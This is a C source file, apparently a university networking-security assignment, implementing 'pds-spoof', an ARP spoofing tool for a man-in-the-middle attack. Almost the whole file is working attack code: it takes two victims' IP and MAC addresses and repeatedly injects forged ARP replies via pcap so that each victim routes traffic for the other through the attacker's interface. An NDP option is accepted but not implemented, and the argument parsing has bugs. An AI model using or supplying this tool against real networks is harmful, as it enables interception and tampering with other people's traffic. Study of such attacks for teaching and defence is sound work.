//VUTBR - FIT - PDS project MitM
//Author: Jan Kubis / xkubis13
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <linux/if_ether.h> // ETH_P_ARP = 0x0806

#include "pds_addr.h"
#include "pds_pkt.h"

typedef struct {
	char* ifName;
	int interval_ms;
	char* protocol;
	mac_t vic1_mac;
	ipv4_t vic1_ipv4;
	ipv6_t vic1_ipv6;
	mac_t vic2_mac;
	ipv4_t vic2_ipv4;
	ipv6_t vic2_ipv6;
} clargs_t;

#define ARG_IPV4_TYPE 1
#define ARG_IPV6_TYPE 2
int arg_ip_type = 0;

void printHelp(){
	printf("Usage: pds-spoof ...\n");
}

int parseArgs(int argc, char* argv[], clargs_t *clargs){
	
	if(argc!=15){return 1;}


	for(int i=1;i<argc;i++){
		if(strcmp(argv[i],"-i")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			clargs->ifName=argv[i];
		}
		else if(strcmp(argv[i],"-t")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			if(!isdigit(*argv[i])){;return 1;} //ms integer
			clargs->interval_ms=strtol(argv[i],NULL,10);
		}
		else if(strcmp(argv[i],"-p")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			if(strcmp(argv[i],"arp")!=0 && strcmp(argv[i],"ndp")!=0){printf("ee");return 1;} // arp || ndp only
			clargs->protocol=argv[i];
		}
		else if(strcmp(argv[i],"-victim1ip")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			if(argv[i][3]=='.'){ //ipv4
				if(arg_ip_type==ARG_IPV6_TYPE){return 1;}
				ptoipv4t(argv[i],clargs->vic1_ipv4);
				arg_ip_type=ARG_IPV4_TYPE;
			}
			else{ //ipv6
				if(arg_ip_type==ARG_IPV4_TYPE){return 1;}
				ptoipv6t(argv[i],clargs->vic1_ipv6);
				arg_ip_type=ARG_IPV6_TYPE;
			}
		}
		else if(strcmp(argv[i],"-victim1mac")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			ptomact(argv[i],clargs->vic1_mac);
		}
		else if(strcmp(argv[i],"-victim2ip")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			if(argv[i][3]=='.'){ //ipv4
				if(arg_ip_type==ARG_IPV6_TYPE){return 1;}
				ptoipv4t(argv[i],clargs->vic2_ipv4);
				arg_ip_type=ARG_IPV4_TYPE;
			}
			else{ //ipv6
				if(arg_ip_type==ARG_IPV4_TYPE){return 1;}
				ptoipv6t(argv[i],clargs->vic2_ipv6);
				arg_ip_type=ARG_IPV6_TYPE;
			}
		}
		else if(strcmp(argv[i],"-victim2mac")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			ptomact(argv[i],clargs->vic2_mac);
		}
		else{
			return 1;
		}
	}

	return 0;
}

void spoof(iface_t iface, clargs_t clargs){
	
	int bytes_written=0;

	while(true){
		uint8_t* pkt1 = arp_pkt_build(clargs.vic2_ipv4,clargs.vic1_ipv4,iface.mac,clargs.vic1_mac,ARP_OP_REPLY);
		uint8_t* pkt2 = arp_pkt_build(clargs.vic1_ipv4,clargs.vic2_ipv4,iface.mac,clargs.vic2_mac,ARP_OP_REPLY);
		
		arp_print((arphdr_t*)(pkt1+14));
		arp_print((arphdr_t*)(pkt2+14));

		bytes_written =pcap_inject(iface.handle, pkt1, PKT_ARP_LEN);
		bytes_written =pcap_inject(iface.handle, pkt2, PKT_ARP_LEN);
		printf("%d\n", bytes_written);
		usleep(clargs.interval_ms*1000);
	}

	return;
}

int main(int argc, char* argv[]){
	clargs_t clargs;
	iface_t iface;

	if((parseArgs(argc,argv,&clargs))!=0){
		printHelp();
		return 0;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	if ((iface.handle=pcap_create(clargs.ifName,errbuf))==NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", clargs.ifName, errbuf);
		return 0;
	}
	iface.name=clargs.ifName;
	getifmac(iface.name,iface.mac);
	getifipv4(iface.name,iface.ipv4);
	pcap_activate(iface.handle);

	spoof(iface,clargs);

	pcap_close(iface.handle);
}